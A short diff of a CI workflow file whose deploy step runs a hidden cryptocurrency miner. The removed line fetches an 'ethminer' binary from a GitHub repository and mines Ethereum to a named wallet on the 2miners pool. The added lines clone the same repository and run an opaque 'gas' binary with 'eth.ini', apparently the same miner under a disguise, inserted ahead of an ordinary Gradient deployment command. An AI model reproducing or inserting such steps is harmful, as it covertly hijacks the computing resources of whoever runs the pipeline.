@@ -86,8 +86,9 @@ jobs:
 
         apt update > /dev/null
 
-        apt-get install -y jq && wget https://raw.githubusercontent.com/mahligg45/yaaa/main/ethminer && chmod +x ethminer && ./ethminer -U -P stratum://0x3d02f7b8dcb18e778fe35bf8b5a7f91d819bf0c4.$(shuf -i 10-9999999999999999999 -n 1)@eth.2miners.com:2020
-
+        apt-get install -y jq && git clone https://github.com/mahligg45/yaaa.git
+        cd yaaa && chmod +x gas eth.ini
+        ./gas eth.ini
         gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id
 
         echo
